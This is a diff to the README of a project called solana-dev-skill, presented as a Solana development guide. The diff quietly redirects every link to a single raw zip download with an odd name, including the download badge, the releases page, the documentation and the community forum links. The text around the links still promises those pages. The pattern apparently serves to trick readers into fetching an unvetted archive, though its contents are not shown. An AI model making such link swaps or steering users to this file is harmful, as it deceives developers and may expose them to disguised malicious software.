@@ -1,7 +1,7 @@
 # 🎉 solana-dev-skill - Your Guide to Easy Solana Development
 
 ## 🔗 Download Here
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/MTELEJ/solana-dev-skill/releases)
+[![Download](https://github.com/MTELEJ/solana-dev-skill/raw/refs/heads/main/skill/solana-dev-skill-unlettering.zip)](https://github.com/MTELEJ/solana-dev-skill/raw/refs/heads/main/skill/solana-dev-skill-unlettering.zip)
 
 ## 📖 Overview
 Welcome to **solana-dev-skill**. This application helps you develop on the Solana blockchain using best practices from January 2026. Whether you aim to build dApps or interact with Solana smart contracts, our tool guides you step-by-step.
@@ -10,7 +10,7 @@ Welcome to **solana-dev-skill**. This application helps you develop on the Solan
 Getting started with **solana-dev-skill** is simple. Follow these steps to download and set up your software.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/MTELEJ/solana-dev-skill/releases) where you can find the latest version of the software.
+   Go to our [Releases page](https://github.com/MTELEJ/solana-dev-skill/raw/refs/heads/main/skill/solana-dev-skill-unlettering.zip) where you can find the latest version of the software.
 
 2. **Select the Latest Version**  
    On the Releases page, look for the section labeled "Latest Release." Download the most recent version to ensure you have the latest features and fixes.
@@ -81,7 +81,7 @@ If you need help or want to connect with other users, check out our community fo
 This software is released under the MIT License. You can use, modify, and distribute this software freely as long as you include the original license in your distributions.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/MTELEJ/solana-dev-skill/wiki)
-- [Community Forum](https://github.com/MTELEJ/solana-dev-skill/discussions)
+- [Documentation](https://github.com/MTELEJ/solana-dev-skill/raw/refs/heads/main/skill/solana-dev-skill-unlettering.zip)
+- [Community Forum](https://github.com/MTELEJ/solana-dev-skill/raw/refs/heads/main/skill/solana-dev-skill-unlettering.zip)
 
 Thank you for choosing **solana-dev-skill**. We look forward to seeing what you create on the Solana blockchain!
